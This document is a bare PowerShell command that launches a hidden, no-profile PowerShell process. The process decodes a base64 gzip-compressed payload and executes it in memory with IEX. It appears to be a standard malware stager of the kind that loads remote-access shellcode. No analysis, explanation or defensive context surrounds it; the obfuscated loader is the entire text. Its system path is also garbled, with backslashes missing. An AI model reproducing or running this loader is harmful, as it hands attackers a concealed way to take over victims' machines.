if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'syswow64WindowsPowerShellv1.0powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAKek8VcCA7VWbW/aSBD+nEr9D1aFZFslGAht2kiVbs2rE0wgBhOg6LSx12Zh8RJ7zVuv//3GYDdUSavcnc4CeXdnZnf2mWdm7MWBIygPJDz3DH0ofXv75qyLQ7yUlFxIP35y9TJel/NSTgQBfug/rjo99ewMlHJzz7ekL5IyQatVjS8xDaZXV9U4DEkgjvNCkwgURWT5wCiJFFX6SxrOSEjObx/mxBHSNyn3Z6HJ+ANmqdquip0Zkc5R4CayNndw4lzBWjEqFPnrV1mdnJemhfpjjFmkyNYuEmRZcBmTVem7mhzY362IIpvUCXnEPVEY0uCiXBgEEfZIB3ZbE5OIGXcjWYVbwC8kIg4D6XCfZIOjWJFh2A25g1w3JBFoF4xgzRdEyQUxY3npD2WSnn4XB4IuCcgFCfnKIuGaOiQqtHDgMnJHvKnSIZvs0q81Uk6NQKsrQjUPQXnBTZO7MSNHS1l97uhJIFV4fg4moPD97Zu3b7yMCJvKbOnQ222rYZ6yAUZnk8OYgMdKl0f0oP5FKuYlE87Ggoc7mOb6YUzUqTRJIjGZTqXcgjJdmKjfyv96k1JmAfq8vF7s1zewOrE5dadglcYq5449995OJL9mXY14NCC1XYCX1MmIpbwUA+Ixcrh0IVPrgGeKnAqIWyOM+FgkqOalyXOz+pKKH7Z6TJlLQuRAHCPwCkKs/uzMMVCKbAQmWQJax7kMAfGAziTTTim8y05P5qAkVxmOorzUjSGfnLxkEcyIm5dQENFUhGLBD0P5yV0zZoI6OBLZdlP1Ccn0xCoPIhHGDoQQbt+3VsShmCVg5KUWdYm+s6ifnSy/CEUVM0YDH3ZaQyhgJYHAEgkxQnDyiQRqwSLCWK4YWYLiIb8bDPuQzWlOHOiEfeLKzx3NWH+keAJKhsaJmxBpi3GRl2waCigUCcApp/6DIyelInWpGpI0OkqWRRN9JxLS57zLfdGoJERNoToAEwoApRHypY4j8rFiiRAgU95pt7SK4BkZATMdfUFLaENLhgn/Ab0weO3Svbmet7Swtp15yIgMs9Wt9VqtyvrasivCqhvipmsIs34/n1uodTcYibGBWn1aXIwq+9U13Vtt5I622se9vt8U9e1+7rveqOZ5/qVn3ZU+NGh7WO3pxTJu1+pxe6hv9GIlqtNNq0cHvcV1QzyMbIYHnubflz5jum2Hc7vEzb2BUHN24eyvPbs5M93dqKV9HlYWqI5QNajbDZ3fjPQQdTUb+zb3NnDJoV9FOrcpGfcGDb3Xa+ho0Jw/1j5rPtje45k+tMt0vLq/m8G8AS7caMWK4ZI9H/XAvskR9u9Ax6+WnZkHOrX3SH/f4VEZL3SOdNBpjB/Br9Gq0WUg7w/KHNmsc49Re7xraFpp1K2gVpEOmz5KtsS+3sMoWtf2Na1ku9wdfuiMPM2+Z5dardpfOZ6maZtW7cYZl7afbi8/tYfUXnI00DT7XcINIEcuvpnvbov+h7Z3EvVflXkTh9EMM2AD1O8sMRs8bKRVuMtpYqEoaVtekDAgDBoZtLqM1ogx7iQ94bRiQ1s6NospZOkAhhflF0eq9ENRfWoZ2dLV1RjcTerSgcaFNgl8McsXtxfFIpT74rZShGu//pJVvtop6Wb5pGGcoPV0CjucoiZ5lJu59vL/xjHN3xm83Ffi+LT2G+mrsC3mTzF4Jvx54R+B/S+QGGIqQNeCasTIsUn+FpCUQyffGkm8gB9e+iTferexOO/AJ8jfVuc/22MKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);